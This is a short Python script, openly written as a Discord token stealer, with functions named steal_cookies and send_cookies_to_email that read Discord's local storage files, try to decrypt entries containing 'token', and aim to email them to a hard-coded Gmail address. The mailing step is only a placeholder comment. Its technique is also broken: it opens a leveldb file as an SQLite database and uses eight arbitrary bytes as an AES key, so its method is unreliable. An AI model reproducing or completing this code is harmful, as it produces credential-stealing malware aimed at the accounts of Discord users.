import os
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    with open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Discord', 'Local Storage', 'leveldb', '_index.ldb'), "rb") as f:
        raw = f.read()
        key = raw[8:16]
        return key

def decrypt_value(encrypted_value):
    key = get_master_key()
    encrypted_value = encrypted_value[3:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[:12])
    decrypted_value = cipher.decrypt(encrypted_value[12:])
    return decrypted_value.decode()

def steal_cookies():
    conn = sqlite3.connect(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Discord', 'Local Storage', 'leveldb', '_index.ldb'))
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM ItemTable")
    cookies = []
    for row in cursor.fetchall():
        decrypted_value = decrypt_value(row[0])
        if 'token' in decrypted_value:
            cookies.append(decrypted_value)
    conn.close()
    return cookies

def send_cookies_to_email(email):
    cookies = steal_cookies()
    if cookies:
        # Send cookies to email
        # (code to send cookies via email using SMTP)
        print("success:", email)
    else:
        print("404 error...")

# Replace 'your_email@example.com' with the victim's email
send_cookies_to_email('kkara9009@gmail.com')
